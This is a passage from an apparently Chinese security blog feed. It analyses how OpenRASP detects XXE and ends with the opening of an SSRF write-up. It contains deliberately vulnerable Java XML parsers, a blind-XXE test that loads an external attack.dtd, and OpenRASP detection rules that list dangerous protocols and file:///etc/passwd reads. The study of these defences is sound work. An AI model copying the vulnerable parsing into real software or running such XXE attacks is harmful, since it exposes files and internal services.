<span class="variable">db</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line">        <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> db.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(body)));</span><br><span class="line"></span><br><span class="line">        <span class="type">NodeList</span> <span class="variable">RegistrationNo</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        tmp = RegistrationNo.item(<span class="number">0</span>).getFirstChild().getNodeValue();</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="XMLReader实现（无回显）"><a href="#XMLReader实现（无回显）" class="headerlink" title="XMLReader实现（无回显）"></a>XMLReader实现（无回显）</h3><p>​在实际环境中XML大多数时候并非是为了输出用，所以很多时候是不会有输出的，这样即使XML被解析了但是是无法直接读取文件的，所以我们需要外带数据，把数据发送出来读取。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//@RequestMapping(method = RequestMethod.POST)等价于@PostMapping</span></span><br><span class="line"><span class="meta">@PostMapping(value = &quot;XMLReader&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">xmlReader</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> IOException, SAXException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> request.getInputStream();</span><br><span class="line">        java.util.<span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">XMLReader</span> <span class="variable">xmlReader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();</span><br><span class="line">        xmlReader.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(body)));</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;xml parser fail&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;xml parser success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>​修复XXE，可以直接禁用DTD，也可禁用外部实体和参数实体。如果不影响业务，考虑不解析XML。</p><h3 id="DocumentBuilderFactory实现"><a href="#DocumentBuilderFactory实现" class="headerlink" title="DocumentBuilderFactory实现"></a>DocumentBuilderFactory实现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dbf.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><h3 id="XmlReader实现"><a href="#XmlReader实现" class="headerlink" title="XmlReader实现"></a>XmlReader实现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这是优先选择. 如果不允许DTDs (doctypes) ,几乎可以阻止所有的XML实体攻击</span></span><br><span class="line">xmlReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 如果不能完全禁用DTDs，最少采取以下措施，必须两项同时存在</span></span><br><span class="line">xmlReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>); <span class="comment">// 防止外部实体POC</span></span><br><span class="line">xmlReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);  <span class="comment">// 防止参数实体POC</span></span><br></pre></td></tr></table></figure><h2 id="OpenRASP检测流程"><a href="#OpenRASP检测流程" class="headerlink" title="OpenRASP检测流程"></a>OpenRASP检测流程</h2><p>远程调试：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -javaagent:D:\javaProject\testRASP\target\rasp\rasp.jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9193 -jar rasp-0.0.1-SNAPSHOT.jar</span><br></pre></td></tr></table></figure><h3 id="DisableDomXxeEntity和XXEHook"><a href="#DisableDomXxeEntity和XXEHook" class="headerlink" title="DisableDomXxeEntity和XXEHook"></a>DisableDomXxeEntity和XXEHook</h3><p>应用类：com&#x2F;sun&#x2F;org&#x2F;apache&#x2F;xerces&#x2F;internal&#x2F;parsers&#x2F;DOMParser、org&#x2F;apache&#x2F;xerces&#x2F;parsers&#x2F;DOMParser</p><p>hook类：DisableDomXxeEntity</p><p>应用类：com&#x2F;sun&#x2F;org&#x2F;apache&#x2F;xerces&#x2F;internal&#x2F;impl&#x2F;XMLEntityManager、org&#x2F;apache&#x2F;xerces&#x2F;impl&#x2F;XMLEntityManager、</p><p>org&#x2F;apache&#x2F;xerces&#x2F;util&#x2F;XMLEntityDescriptionImpl</p><p>hook类：XXEHook（XXE抽象类）</p><p>​这里测试用例是上面的“任意文件读取”payload，测试目标是DocumentBuilderFactory实现的XML解析，hook类DisableDomXxeEntity会拦截执行流。观察执行栈，可知在应用方法documentBuilder.parse内部会调用DOMParser.parse，检测代码setFeature就插入在DOMParser.parse执行前。检测代码setFeature，如果对XXE的action设置为block，就反射调用DOMParser.setFeature，直接设置XML解析器不允许DTD，是最严格的防御手段。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//位于DisableDomXxeEntity的hookMehtod方法</span></span><br><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(DisableDomXxeEntity.class, <span class="string">&quot;setFeature&quot;</span>, <span class="string">&quot;$0&quot;</span>, Object.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;parse&quot;</span>, <span class="literal">null</span>, src);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//setFeature方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFeature</span><span class="params">(Object parser)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (HookHandler.isEnableCurrThreadHook()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">action</span> <span class="operator">=</span> getAction();</span><br><span class="line">        <span class="keyword">if</span> (BLOCK_XXE_DISABLE_ENTITY.equals(action) &amp;&amp; getStatus(<span class="string">&quot;java_dom&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Reflection.invokeMethod(parser, <span class="string">&quot;setFeature&quot;</span>,</span><br><span class="line">                                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, <span class="type">boolean</span>.class&#125;, FEATURE, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                LogTool.traceHookWarn(<span class="string">&quot;Dom close xxe entity failed: &quot;</span> + t.getMessage(), t);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​js对XXE的action设置一般为“ignore”，此时DOMParser.parse继续执行，当执行到XMLEntityManager.expandSystemId方法时，插桩在该位置的XXEHook.checkXXE方法，会获取每次解析的内容（SystemId）。checkXXE代码逻辑是，当缓存中还没有该SystemId时，就将其放入params，交给HookHandler.doCheck进入V8检测，js部分的“xxe_file”算法将检测出该payload用于文件读取。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//位于XXEHook的hookMethod方法</span></span><br><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(XXEHook.class, <span class="string">&quot;checkXXE&quot;</span>, <span class="string">&quot;$1&quot;</span>, String.class);</span><br><span class="line"><span class="type">String</span> <span class="variable">src1</span> <span class="operator">=</span> getInvokeStaticSrc(XXEHook.class, <span class="string">&quot;checkXXE&quot;</span>, <span class="string">&quot;$5&quot;</span>, String.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;expandSystemId&quot;</span>, <span class="string">&quot;(Ljava/lang/String;Ljava/lang/String;Z)Ljava/lang/String;&quot;</span>, src);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;setDescription&quot;</span>, <span class="string">&quot;(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;&quot;</span> +</span><br><span class="line">             <span class="string">&quot;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V&quot;</span>, src1);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//checkXXE方法</span></span><br><span class="line"><span class="keyword">if</span> (expandedSystemId != <span class="literal">null</span> &amp;&amp; !XXEHook.getLocalExpandedSystemIds().contains(expandedSystemId)) &#123;</span><br><span class="line">    XXEHook.getLocalExpandedSystemIds().add(expandedSystemId);</span><br><span class="line">    HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">    params.put(<span class="string">&quot;entity&quot;</span>, expandedSystemId);</span><br><span class="line">    HookHandler.doCheck(CheckParameter.Type.XXE, params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="XMLReader实现"><a href="#XMLReader实现" class="headerlink" title="XMLReader实现"></a>XMLReader实现</h3><p>​XMLReader实现XML解析时，OpenRASP对其阻断发生在XMLEntityManager类的expandSystemId方法，还是通过XXEHook.checkXXE方法进行检测。同时，XMLReader解析逻辑发现payload为外部引用“ <a href="http://192.168.1.3:8084/attack.dtd">http://192.168.1.3:8084/attack.dtd</a> ”，会调用connect.getInputStream()，这样会进入OpenRASP对HttpURLConnection类的SSRF检测。</p><p>​这里使用的测试用例是“Blind XXE”payload，虽然，前面的步骤并没有被OpenRASP给block掉，但是，获取外部dtd后，对外部dtd文件的解析仍会继续。当解析到外部dtd文件使用file协议读取文件，这些具体的攻击行为时，OpenRASP仍会把解析内容交给XXEHook.checkXXE方法，产生最终的阻断。</p><p>​这里也能明白，在OpenRASP项目xxe目录下，Disable为前缀的文件，是插桩XML解析不同实现类的hook类，其检测代码只是反射调用这些实现类的setFeature方法，在OpenRASP要求对xxe严格阻断时，配置对DTD禁用。而XXEHook等hook类，包括IBMXmlHook等适配指定中间件的类，才是获取解析内容（SystemId），递交给V8进行检测。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checkXXE:102, XXEHook (com.baidu.openrasp.hook.xxe)</span><br><span class="line">invoke:-1, GeneratedMethodAccessor35 (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">expandSystemId:2004, XMLEntityManager (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">setupCurrentEntity:613, XMLEntityManager (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">determineDocVersion:148, XMLVersionDetector (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">parse:806, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:771, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:141, XMLParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:1213, AbstractSAXParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">xmlReader:31, XXEController (com.bmsk.rasp.controller)</span><br></pre></td></tr></table></figure><h2 id="XXE检测算法"><a href="#XXE检测算法" class="headerlink" title="XXE检测算法"></a>XXE检测算法</h2><p>1.控制变量</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// XXE - 代码安全开关，通过调用相关函数直接禁止外部实体</span></span><br><span class="line"><span class="attr">xxe_disable_entity</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法1 - 禁止外部实体加载（记录日志等同于完全忽略）&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;ignore&#x27;</span>,</span><br><span class="line">    <span class="attr">clazz</span>:  &#123;</span><br><span class="line">        <span class="comment">// com/sun/org/apache/xerces/internal/jaxp/DocumentBuilderFactoryImpl</span></span><br><span class="line">        <span class="attr">java_dom</span>:   <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// org/dom4j/io/SAXReader</span></span><br><span class="line">        <span class="attr">java_dom4j</span>: <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// org/jdom/input/SAXBuilder,org/jdom2/input/SAXBuilder</span></span><br><span class="line">        <span class="attr">java_jdom</span>:  <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// com/sun/org/apache/xerces/internal/jaxp/SAXParserFactoryImpl</span></span><br><span class="line">        <span class="attr">java_sax</span>:   <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// javax/xml/stream/XMLInputFactory</span></span><br><span class="line">        <span class="attr">java_stax</span>:  <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line"><span class="comment">// XXE - 使用 gopher/ftp/dict/.. 等不常见协议访问外部实体</span></span><br><span class="line"><span class="attr">xxe_protocol</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法2 - 使用 ftp:// 等异常协议加载外部实体&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;block&#x27;</span>,</span><br><span class="line">    <span class="attr">protocols</span>: [</span><br><span class="line">        <span class="string">&#x27;ftp&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;dict&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;gopher&#x27;</span>,</span><br><span class="line">        <span class="comment">// &#x27;jar&#x27;, // jenkins下存在误报</span></span><br><span class="line">        <span class="string">&#x27;netdoc&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mailto&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// XXE - 使用 file 协议读取内容，可能误报，默认 log</span></span><br><span class="line"><span class="attr">xxe_file</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:      <span class="string">&#x27;算法3 - 使用 file:// 协议读取文件&#x27;</span>,</span><br><span class="line">    <span class="attr">reference</span>: <span class="string">&#x27;https://rasp.baidu.com/doc/dev/official.html#case-xxe&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>:    <span class="string">&#x27;log&#x27;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 记录日志模式: 将所有 block 改为 log</span></span><br><span class="line"><span class="keyword">if</span> (algorithmConfig.<span class="property">meta</span>.<span class="property">all_log</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(algorithmConfig).<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">name</span>) &#123;</span><br><span class="line">        <span class="comment">// XXE 外部实体开关不受影响</span></span><br><span class="line">        <span class="keyword">if</span> (name != <span class="string">&#x27;xxe_disable_entity&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (algorithmConfig[name].<span class="property">action</span> == <span class="string">&#x27;block&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                algorithmConfig[name].<span class="property">action</span> = <span class="string">&#x27;log&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.匹配规则和返回内容</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">plugin.<span class="title function_">register</span>(<span class="string">&#x27;xxe&#x27;</span>, <span class="keyword">function</span> (<span class="params">params, context</span>) &#123;</span><br><span class="line">    plugin.<span class="title function_">log</span>(<span class="string">&#x27;Loading XML entity: &#x27;</span> + params.<span class="property">entity</span>)</span><br><span class="line">        <span class="keyword">return</span> clean</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意: 由于libxml2无法挂钩，所以PHP暂时不支持XXE检测</span></span><br><span class="line">plugin.<span class="title function_">register</span>(<span class="string">&#x27;xxe&#x27;</span>, <span class="keyword">function</span> (<span class="params">params, context</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> server      = context.<span class="property">server</span></span><br><span class="line">        <span class="keyword">var</span> is_win      = server.<span class="property">os</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;Windows&#x27;</span>) != -<span class="number">1</span></span><br><span class="line">        <span class="keyword">var</span> items       = params.<span class="property">entity</span>.<span class="title function_">split</span>(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        <span class="keyword">var</span> parameters  = context.<span class="property">parameter</span> || &#123;&#125;</span><br><span class="line">    <span class="keyword">var</span> header      = context.<span class="property">header</span> || &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">xxe_protocol</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// 检查 windows + SMB 协议，防止泄露 NTLM 信息</span></span><br><span class="line">        <span class="keyword">if</span> (params.<span class="property">entity</span>.<span class="title function_">startsWith</span>(<span class="string">&#x27;\\\\&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">xxe_protocol</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;XXE - Using dangerous protocol SMB&quot;</span>),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">100</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;xxe_protocol&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (items.<span class="property">length</span> &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> protocol = items.<span class="title function_">shift</span>().<span class="title function_">toLowerCase</span>()</span><br><span class="line">            <span class="keyword">var</span> address  = items.<span class="title function_">join</span>(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 拒绝特殊协议</span></span><br><span class="line">            <span class="keyword">if</span> (algorithmConfig.<span class="property">xxe_protocol</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (algorithmConfig.<span class="property">xxe_protocol</span>.<span class="property">protocols</span>.<span class="title function_">indexOf</span>(protocol) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;</span><br><span class="line">                        <span class="attr">action</span>:     algorithmConfig.<span class="property">xxe_protocol</span>.<span class="property">action</span>,</span><br><span class="line">                        <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;XXE - Using dangerous protocol %1%&quot;</span>, [protocol]),</span><br><span class="line">                        <span class="attr">confidence</span>: <span class="number">100</span>,</span><br><span class="line">                        <span class="attr">algorithm</span>:  <span class="string">&#x27;xxe_protocol&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// file 协议 + 绝对路径, e.g</span></span><br><span class="line">        <span class="comment">// file:///etc/passwd</span></span><br><span class="line">        <span class="comment">// file:///etc/passwd?a=1#b=2 (仅Java支持)</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// 相对路径容易误报, e.g</span></span><br><span class="line">        <span class="comment">// file://xwork.dtd</span></span><br><span class="line">        <span class="keyword">if</span> (algorithmConfig.<span class="property">xxe_file</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (address.<span class="property">length</span> &gt; <span class="number">0</span> &amp;&amp; protocol === <span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (address.<span class="title function_">startsWith</span>(<span class="string">&quot;//&quot;</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 去掉file://中的//，两种格式统一逻辑处理</span></span><br><span class="line">                    <span class="comment">// file:/etc/passwd</span></span><br><span class="line">                    <span class="comment">// file:///etc/passwd</span></span><br><span class="line">                    address = address.<span class="title function_">substr</span>(<span class="number">2</span>)</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">var</span> address_lc = address.<span class="title function_">toLowerCase</span>()</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (address_lc.<span class="title function_">indexOf</span>(<span class="string">&quot;../&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="comment">// 使用 ../</span></span><br><span class="line">                        <span class="keyword">return</span> &#123;</span><br><span class="line">                            <span class="attr">action</span>:     algorithmConfig.<span class="property">xxe_file</span>.<span class="property">action</span>,</span><br><span class="line">                            <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;XXE - Accessing file %1% with ../&quot;</span>, [address]),</span><br><span class="line">                            <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                            <span class="attr">algorithm</span>:  <span class="string">&#x27;xxe_file&#x27;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (address_lc.<span class="title function_">indexOf</span>(<span class="string">&quot;#&quot;</span>) !=-<span class="number">1</span> || address_lc.<span class="title function_">indexOf</span>(<span class="string">&quot;?&quot;</span>) !=-<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;</span><br><span class="line">                        <span class="attr">action</span>:     algorithmConfig.<span class="property">xxe_file</span>.<span class="property">action</span>,</span><br><span class="line">                        <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;XXE - Using url comment in file path %1%&quot;</span>, [address]),</span><br><span class="line">                        <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                        <span class="attr">algorithm</span>:  <span class="string">&#x27;xxe_file&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_">is_absolute_path</span>(address, is_win) ||</span><br><span class="line">                    address_lc.<span class="title function_">startsWith</span>(<span class="string">&quot;localhost&quot;</span>) ||</span><br><span class="line">                    (is_win &amp;&amp; items.<span class="property">length</span> &gt; <span class="number">2</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 三种情况：</span></span><br><span class="line">                    <span class="comment">// 一般绝对路径 file:/etc/passwd</span></span><br><span class="line">                    <span class="comment">// localhost起始路径 file://localhost/c:/windows/win.ini</span></span><br><span class="line">                    <span class="comment">// 带盘符的windows绝对路径 file:c:/windows/win.ini</span></span><br><span class="line">                    <span class="comment">// 1.0 Rhino 引擎不支持URL对象，考虑到 1.0 用户不多，先简单处理下</span></span><br><span class="line">                    <span class="keyword">var</span> content_type = header[<span class="string">&quot;content-type&quot;</span>] || <span class="string">&quot;&quot;</span></span><br><span class="line">                        <span class="keyword">if</span> (content_type.<span class="title function_">indexOf</span>(<span class="string">&quot;xml&quot;</span>) != -<span class="number">1</span> || <span class="title function_">is_include_in_userinput</span>(parameters, address)) &#123;</span><br><span class="line">                            <span class="comment">// 过滤掉 xml、dtd、xsd</span></span><br><span class="line">                            <span class="keyword">if</span> (! address_lc.<span class="title function_">endsWith</span>(<span class="string">&#x27;.xml&#x27;</span>) &amp;&amp;</span><br><span class="line">                                ! address_lc.<span class="title function_">endsWith</span>(<span class="string">&#x27;.xsd&#x27;</span>) &amp;&amp;</span><br><span class="line">                                ! address_lc.<span class="title function_">endsWith</span>(<span class="string">&#x27;.dtd&#x27;</span>))</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="keyword">return</span> &#123;</span><br><span class="line">                                    <span class="attr">action</span>:     algorithmConfig.<span class="property">xxe_file</span>.<span class="property">action</span>,</span><br><span class="line">                                    <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;XXE - Accessing file %1%&quot;</span>, [address]),</span><br><span class="line">                                    <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                                    <span class="attr">algorithm</span>:  <span class="string">&#x27;xxe_file&#x27;</span></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clean</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>《Java代码审计-入门篇》和《Java代码审计实战》</span><br><span class="line"><span class="number">2.</span>官方文档 Hook函数列表 和 功能说明</span><br><span class="line">https:<span class="comment">//rasp.baidu.com/doc/hacking/architect/hook.html</span></span><br><span class="line">https:<span class="comment">//rasp.baidu.com/doc/usage/main.html</span></span><br><span class="line"><span class="number">3.</span>Java Sec Code靶场</span><br><span class="line">https:<span class="comment">//github.com/JoyChou93/java-sec-code</span></span><br><span class="line"><span class="number">4.</span>WEB安全&amp;JAVA代码审计：XXE外部实体注入</span><br><span class="line">    https:<span class="comment">//www.freebuf.com/articles/web/318984.html</span></span><br><span class="line"><span class="number">5.</span>XML中实体的概念</span><br><span class="line">    https:<span class="comment">//blog.csdn.net/janchin/article/details/46849209</span></span><br><span class="line"><span class="number">6.</span>盲XXE攻击 -带外交互技术(OAST) 泄露数据</span><br><span class="line">    https:<span class="comment">//xz.aliyun.com/t/9519#toc-5</span></span><br><span class="line"><span class="number">7.</span>XXE从入门到放弃</span><br><span class="line">    https:<span class="comment">//www.anquanke.com/post/id/197423#h3-4%22%20/h</span></span><br><span class="line"><span class="number">8.</span>一篇文章带你深入理解漏洞之 XXE 漏洞</span><br><span class="line">    https:<span class="comment">//xz.aliyun.com/t/3357</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenRASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenRASP-SSRF漏洞</title>
      <link href="/2022/12/22/OpenRASP-SSRF%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/12/22/OpenRASP-SSRF%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="OpenRASP-SSRF漏洞"><a href="#OpenRASP-SSRF漏洞" class="headerlink" title="OpenRASP-SSRF漏洞"></a>OpenRASP-SSRF漏洞</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>​SSRF（Server-Side Request Forge，服务端伪造请求），漏洞原理为，服务端提供了从其他服务器应用获取数据的功能且没有对目标地址和传入命令进行过滤与限制造成的，如常见的从指定URL加载图片、文本资源或者获取指定页面的网页内容等。</p><p>​攻击者首先向可直接访问的Web站点发送攻击载荷，该攻击载荷的攻击对象为内部网络，然后，Web站点作为“中间人”，将包含有恶意攻击请求的请求传递给内部网络，内部网络接受请求并处理后，将结果返回给Web站点。最后，Web站点将内部网络返回的结果传递给攻击者，以此达到攻击内部网络的目的。</p><p>​利用SSRF漏洞能实现的事情有：扫描内网、向内网任意主机的任意端口发送恶意请求、攻击内网Web应用、读取文件以及拒绝服务攻击等。Java中的SSRF利用有局限性，一般利用http&#x2F;https协议来探测端口、暴力穷举等，还可以通过file协议读取&#x2F;下载任意文件。</p><blockquote><p>file协议：也叫本地文件传输协议，主要用于访问本地计算机中的文件，url格式为“file:&#x2F;&#x2F;&#x2F;C:&#x2F;Users&#x2F;bmsk&#x2F;Desktop&#x2F;017-xss.jsp”。</p><p>file协议只能在本地访问，file无法实现跨域，file协议对应有一个类似http的远程访问，就是ftp协议，即文件传输协议。本地搭建http服务器开放端口后他人也可以通过http访问到你电脑中的文件，但是file协议做不到。所以file协议三道杠没有host名。</p></blockquote><h2 id="业务代码"><a href="#业务代码" class="headerlink" title="业务代码"></a>业务代码</h2><p>​启动一个http服务器作为攻击目标：python38 -m http.server –bind 127.0.0.1 8090。</p><h3 id="1-URLConnection实现"><a href="#1-URLConnection实现" class="headerlink" title="1.URLConnection实现"></a>1.URLConnection实现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span 